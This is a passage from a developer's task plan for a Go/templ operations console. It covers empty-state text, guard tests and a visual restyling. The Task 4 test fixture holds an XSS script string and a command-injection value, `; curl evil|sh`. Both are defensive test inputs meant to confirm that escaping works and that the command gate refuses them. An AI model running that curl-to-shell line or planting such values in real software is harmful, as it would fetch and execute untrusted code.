					<div class="px-4 py-3 text-sm text-warm-muted">No role assignments projected. Role routing appears once the hive projects its model-selection policy.</div>
```

Config models empty (replace div content):

```templ
					<div class="px-4 py-3 text-sm text-warm-muted">No catalog models projected. The catalog is hive-owned (<span class="font-mono text-[11px]">HIVE_OPS_CATALOG</span>) and hot-reloaded.</div>
```

Run `templ generate`.

- [ ] **Step 4: Run the full console suite**

Run: `go test ./graph/ -run 'Console' -count=1`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add graph/console.templ graph/console_templ.go graph/console_kanban_test.go graph/console_intake_test.go graph/console_test.go graph/console_config_test.go
git commit -m "feat(console): purposeful empty states that teach the intake flow"
```

---

### Task 4: Read-only + hostile-projection guard extensions

**Files:**
- Test: extend `graph/console_intake_test.go`

**Interfaces:** none new — guard tests over Task 1-2 output.

- [ ] **Step 1: Write the tests** (they should PASS immediately if Tasks 1-2 are correct — any failure is a real defect in those tasks; fix the implementation, never the assertion)

```go
// The intake surface (page, fragment, and an open unblock drawer) must stay
// write-affordance-free: the unblock section is selectable text, not a control.
func TestConsoleIntakeSurfaceRendersNoWriteControls(t *testing.T) {
	// render: full page with populated board, fragment, and the drawer for a
	// label-parked card (unblock section present).
	// For each body, assert (case-insensitive) absence of:
	//   "<form", "hx-post", "hx-put", "hx-delete", "hx-patch",
	//   "type=\"submit\"", "/ops/hive/model-policy"
	// (the drawer close button and card open buttons are type="button" — allowed).
}

// Hostile projection data must neither escape into markup nor produce a command.
func TestConsoleIntakeUnblockGateRefusesHostileData(t *testing.T) {
	// fixture: label-parked card whose target repo is
	//   `transpara-ai/docs"><script>alert(1)</script>` and a second card with
	//   repo `transpara-ai/docs; curl evil|sh`, number 226, blocker
	//   needs_human_scope, label cc:needs-human-scope.
	// render page + drawer for both cards; assert:
	//   - raw payloads (`<script>alert`, `curl evil|sh` inside a gh command) absent
	//   - "gh issue edit" absent (gate refused — this asserts the GATE, not just escaping)
	//   - "&lt;script" present for the first (escaping occurred)
	//   - "unblock available" absent (hint suppressed too)
}
```

- [ ] **Step 2: Run**

Run: `go test ./graph/ -run 'NoWriteControls|RefusesHostile' -count=1`
Expected: PASS (if FAIL → fix `console_unblock.go`/templates, never the test)

- [ ] **Step 3: Commit**

```bash
git add graph/console_intake_test.go
git commit -m "test(console): read-only and hostile-projection guards over the unblock surface"
```

---

### Task 5: Visual coherence pass (all four tabs)

**Files:**
- Modify: `graph/console.templ` (badge ~line 68-79, tabs ~line 58-66, lens nav ~line 254-269, kanban columns ~line 98-107, intake columns ~line 147-156, health stat cards ~line 344-354)
- Test: extend `graph/console_test.go`
- Regenerate: `templ generate`

**Interfaces:** none new — markup/classes only. Every projected field currently rendered MUST remain rendered.

- [ ] **Step 1: Write the failing tests**

```go
// console_test.go
func TestConsoleFreshnessBadgeCarriesStateDot(t *testing.T) {
	// render consoleFreshnessBadge for all four states into a buffer;
	// assert each output contains `data-freshness="current|stale|partial|unavailable"`
	// and the current state contains "live".
}

func TestConsoleActiveTabIsAriaCurrent(t *testing.T) {
	// render full console page with Active="kanban"; assert `aria-current="page"`
	// appears exactly once and on the kanban tab anchor.
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `go test ./graph/ -run 'BadgeCarriesStateDot|AriaCurrent' -count=1`
Expected: FAIL

- [ ] **Step 3: Implement in `graph/console.templ`**

Badge (replace `consoleFreshnessBadge` body):

```templ
templ consoleFreshnessBadge(f ConsoleFreshness, generatedAt string) {
	switch f {
		case FreshnessCurrent:
			<span data-freshness="current" class="inline-flex items-center gap-1.5 text-xs text-emerald-300"><span class="w-1.5 h-1.5 rounded-full bg-emerald-400" aria-hidden="true"></span>live<span class="font-mono text-[11px] text-warm-muted">{ generatedAt }</span></span>
		case FreshnessStale:
			<span data-freshness="stale" class="inline-flex items-center gap-1.5 text-xs text-amber-300"><span class="w-1.5 h-1.5 rounded-full bg-amber-400" aria-hidden="true"></span>stale · last update<span class="font-mono text-[11px] text-warm-muted">{ generatedAt }</span></span>
		case FreshnessPartial:
			<span data-freshness="partial" class="inline-flex items-center gap-1.5 text-xs text-amber-300"><span class="w-1.5 h-1.5 rounded-full bg-amber-400" aria-hidden="true"></span>partial · some sources degraded</span>
		default:
			<span data-freshness="unavailable" class="inline-flex items-center gap-1.5 text-xs text-warm-muted"><span class="w-1.5 h-1.5 rounded-full border border-warm-muted" aria-hidden="true"></span>unavailable</span>
	}
}
```

Active tab (in `consoleTab`, active branch only):

```templ
		<a href={ templ.SafeURL(href) } aria-current="page" class="px-3 py-2 border-b-2 border-brand text-warm font-medium">{ label }</a>
```

Lens nav (replace `consoleKanbanLensNav` + `consoleLensLink`):

```templ
templ consoleKanbanLensNav(active ConsoleKanbanLens) {
	<div class="inline-flex rounded-md border border-edge overflow-hidden text-xs" role="group" aria-label="Kanban lens">
		@consoleLensLink("risk", "Risk + aging", active)
		@consoleLensLink("status", "Status", active)
		@consoleLensLink("agent", "Agent", active)
		@consoleLensLink("source", "Source", active)
	</div>
}

templ consoleLensLink(lens, label string, active ConsoleKanbanLens) {
	if ConsoleKanbanLens(lens) == active {
		<a href={ templ.SafeURL("/console/kanban?lens=" + lens) } aria-current="true" class="px-2.5 py-1 bg-elevated text-warm border-l border-edge first:border-l-0">{ label }</a>
	} else {
		<a href={ templ.SafeURL("/console/kanban?lens=" + lens) } class="px-2.5 py-1 text-warm-muted hover:text-warm hover:bg-elevated/50 transition-colors border-l border-edge first:border-l-0">{ label }</a>
	}
}
```

Kanban column header (replace the `<h2>` inside the columns loop):

```templ
						<h2 class="flex items-center gap-2 text-xs uppercase tracking-wide text-warm-muted">{ col.Label } <span class="rounded-full bg-elevated px-2 py-0.5 text-[10px] font-mono text-warm-secondary">{ columnCount(col) }</span></h2>
```

Intake column header (replace the `<h3>` inside the columns loop):

```templ
						<h3 class="flex items-center gap-2 text-xs uppercase tracking-wide text-warm-muted">{ col.Label } <span class="rounded-full bg-elevated px-2 py-0.5 text-[10px] font-mono text-warm-secondary">{ strconv.Itoa(len(col.Cards)) }</span></h3>
```

Health stat cards: add the pending-approvals context only if not present; keep both cards' classes identical to Config's stat cards (`border border-edge bg-surface rounded-lg p-4`, label `text-xs text-warm-muted`, value `text-2xl text-warm`) — they already match; verify, change nothing if identical.

Run `templ generate`.

- [ ] **Step 4: Full suite + build**

Run: `go test ./graph/ -count=1 && go vet ./... && go build ./...`
Expected: PASS/clean

- [ ] **Step 5: Commit**

```bash
git add graph/console.templ graph/console_templ.go graph/console_test.go
git commit -m "feat(console): coherent visual pass — badges with state dots, segmented lens nav, count pills, aria-current"
```

---

### Task 6: Full verification

**Files:** none new.

- [ ] **Step 1: Regenerate + drift check**

Run: `templ generate && git status --porcelain`
Expected: no unstaged `*_templ.go` drift (empty output)

- [ ] **Step 2: Full verify**

Run: `make verify`
Expected: canonical paths OK, build OK, public shell clean, all tests pass, vet clean

- [ ] **Step 3: Commit anything outstanding, otherwise no-op**
